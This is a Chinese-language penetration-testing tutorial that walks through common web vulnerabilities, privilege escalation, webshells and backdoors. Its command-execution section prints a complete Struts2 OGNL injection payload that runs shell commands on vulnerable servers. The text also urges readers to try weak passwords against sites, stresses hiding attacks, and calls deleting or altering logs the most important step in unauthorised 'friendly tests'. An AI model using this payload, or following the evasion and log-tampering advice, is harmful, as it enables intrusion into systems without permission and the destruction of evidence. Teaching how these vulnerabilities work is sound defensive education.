## 目录漏洞
* * *
  * 漏洞原理：该漏洞旨在访问储存在Web根文件外的文件或者目录。主要分为以下两种  
目录列表漏洞：用户访问网站目录地址时，能看到目录下所有文件列表，导致网站目录结构暴露，重要的敏感数据泄露。目录遍历漏洞：程序没有充分过滤用户输入的../之类的目录跳转符，导致用户可以通过提交目录跳转来遍历服务器上的任意文件。使用多个..符号，不断向上跳转，最终停留在根/，通过绝对路径去读取任意文件。
  * 漏洞靶场：简单的网站框架就可以实现相应漏洞，在我们的靶场中会集成本漏洞
  * 漏洞实战演练：`http://sec.sangfor.com.cn/vulns/236.html` `Pligg CMS 2.0.2` 目录遍历漏洞  
  * 个人总结：其实在目录漏洞需要配合其他的漏洞进行组合攻击，单独目录漏洞的危害性并不大，但他的可利用程度确很高，当存在其他的漏洞时，这个漏洞就可以帮助我们获取到更多的权限。
## 文件包含漏洞
* * *
  * 漏洞原理：程序开发人员通常会把要重复使用的函数写到单个文件中，在使用某个函数时直接在文件里面调用此函数无需再次编写。
    * 文件包含有两种：  
本地文件包含配合本地的文件遍历漏洞，可以执行任意文件代码
  * 远程文件包含 ：即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。配合本地的文件遍历漏洞，可以执行任意文件代码
  * 漏洞靶场：靶场为jsp语言，会带领大家搭建相对应的文件包含环境，但不存在靶场中
  * 漏洞实战演练：`[www.xuebuyuan.com/1062689.html](http://www.xuebuyuan.com/1062689.html)` `Phpcms 2007` 远程文件包含漏洞
  * 个人总结：执行任意代码，包含恶意文件控制网站甚至控制服务器，这个漏洞的危害是巨大的，但他主要存在于ＰＨＰ的环境中。对环境的依赖程度也相对要高，确相对好整改，只要限制好目录的权限，这个漏洞可以造成的影响并不大。
## 命令执行漏洞
* * *
  * 漏洞原理：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。
  * 漏洞靶场：  
  * 漏洞实战演练：网上随处可见的`struts2`网站，只要是没有升级或打上补丁的，都会存在问题
  * 个人总结：最常见的命令执行漏洞就是`struts2`漏洞了，当然，还有`weblogic`等等，今天主要给大家分享`struts2`的相关知识  
`Struts2`是一个基于`MVC`设计模式的`Web`应用框架，它本质上相当于一个servlet，在MVC设计模式中，`Struts2`作为控制器`(Controller)`来建立模型与视图的数据交互。`Struts
2`是`Struts`的下一代产品，是在 `struts 1`和`WebWork`的技术基础上进行了合并的全新的`Struts
2`框架。其全新的`Struts 2`的体系结构与`Struts 1`的体系结构差别巨大。`Struts
2`以`WebWork`为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与`ServletAPI`完全脱离开，所以`Struts
2`可以理解为`WebWork`的更新产品。虽然从`Struts 1`到`Struts 2`有着太大的变化，但是相对于`WebWork，Struts
2`的变化很小。  
对应ＰＯＣ：  
`["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"`  
简单的利用方法
## 弱口令漏洞
* * *
  * 漏洞原理：就是说由常用数字、字母、字符等组合成的，容易被别人通过简单及平常的思维方式就能猜到的密码，利用弱口令结合计算机系统等漏洞可以做到入侵的事半功倍的效果  
主要的探测方法为测试验证码的功能，如果目标站的验证机制不完善，或存在逻辑漏洞，则可以利用该漏洞进行暴力破解攻击，结合社工的结果进行测试，如果用户存在弱口令漏洞，就会被攻击方加以利用，伪装成普通用户的权限进行登录，扩大攻击者的权限范畴，增加网站的风限程度
  * 漏洞靶场：靶场的登录处就是这个漏洞  
漏洞实战演练：本漏洞主要成因是人为的，需要手工去寻找。
  * 个人总结：只要做好社工，基本上网站全是弱口令，这是某个大神说的。我觉的非常的有道理。希望大家各级去尝试。
## 文件上传漏洞
* * *
  * 漏洞原理：在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。
  * 漏洞靶场：  
  * 漏洞实战演练：`https://www.lvtao.net/shell/phpcms-upload-webshell.html` `phpcms`前台头像上传漏洞导致`webshell`详解及案例
  * 个人总结：这个漏洞被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。  
主要是上传木马文件及反弹工具等，在网络上现在也存在这各种防护方法，具体的绕过我们就不讲了，主要分享一下，上传的东西，与方法。  
上传`webshell`，按语言主要分为三种`php,asp,jsp`其他衍生的类型不计其数，但核心仍是这三种，主要目的就是通过`webshell`，对网站进行控制。
## 漏洞利用
* * *
  * 目的：我们整个攻击行为的目的，比如获取flag,目标服务器权限等等，根据我们不同的目的，我们要做出不同的针对性的攻击，可以大大节省我的时间和资源。  
隐藏：在攻击的过程中，我们要学会隐藏自己，把我们的攻击行为隐藏起来，这样我们就可以保证我们在攻击的过程中不会被发现，导致我们的攻击过程被强行中断，减少不必要的工作量。
  * 特定场景的针对测试：每一个目标的环境就行人一样，都是维一的，没有一模一样的环境，所以我们要针对不同的环境去做不同的攻击，减少没必要的行为。
## 权限提升
* * *
当我们拿到webshell后，我们要做的就是权限提升了，我们真正开接触到我们的目标了现在。
  * 内部信息收集：
    * 根据我们的目标，我们要开始收拾信息，网站的基本信息，管理者的行为信息，目标的内部环境等，我们有了一个跳板就要把我们可以拿到的点都拿到手中，这样才可以保证我们的目的达成。
  * 系统漏洞利用：
    * 我们的主要方法是溢出漏洞，当然也存在其他的提权方法，但在这节课中不涉及那些高级的应用了。在溢出漏洞中，我们首先要通过我们收集到的信息来确定我们可以利用的漏洞有可能有那些，如果运气好，我们的漏洞有可以利用的那直接利用已有的角本，我们可以直接拿到服务器的权限了，如果不能，那就要去一点点的测试，看看这个系统上安装了什么软件，然后去寻找一个可以让我们利用的溢出点，能过编写这个脚本来进行提权。比较常见的提权脚本有：  
当然，还有很多很多，我就不一一展示了，还有一部分要涉及到密码的寻找，如果，我们没有办法溢出，那我们就要想办法找到高级管理员的密码，来登录到高权限的帐户上去  
## 后门
* * *
### 网页后门
网页后门其实就是一段网页代码，主要以ASP和PHP代码为主。由于这些代码都运行在服务器端，攻击者通过这段精心设计的代码，在服务器端进行某些危险的操作，获得某些敏感的技术信息或者通过渗透，提权获得服务器的控制权。并且这也是攻击者控制服务器的一条通道，比一般的入侵更具有隐蔽性。
### 网页挂马
网页挂马就是攻击者通过在正常的页面中（通常是网站的主页）插入一段代码。浏览者在打开该页面的时候，这段代码被执行，然后下载并运行某木马的服务器端程序，进而控制浏览者的主机。  
这是主要的两种后门情况，一个好的后门要保证自身不被发现，不被安全软件识别并杀死，可以进行实时的更新。
## 日志清扫
* * *
完成一次完整形的渗透测试，最后一步，是对日志的处理，当我们有客户授权的情况下，这一步并不重要，但当你是自己做一些友情测试里，这一步就是最重要的一步，你要通过对日志的处理来更好的保护自己，删除敏感日志，或修改日志内容，并备份真实日志。
## 经验总结
* * *
整个测试结束，我们要对我们的思路和过程做一个完整的总结，保证下次我们遇到类似的环境时，可以直接利用我们已经有的东西，并在自身的团队中交流经验，总结这次工作中的不足，这是进步最好的方法。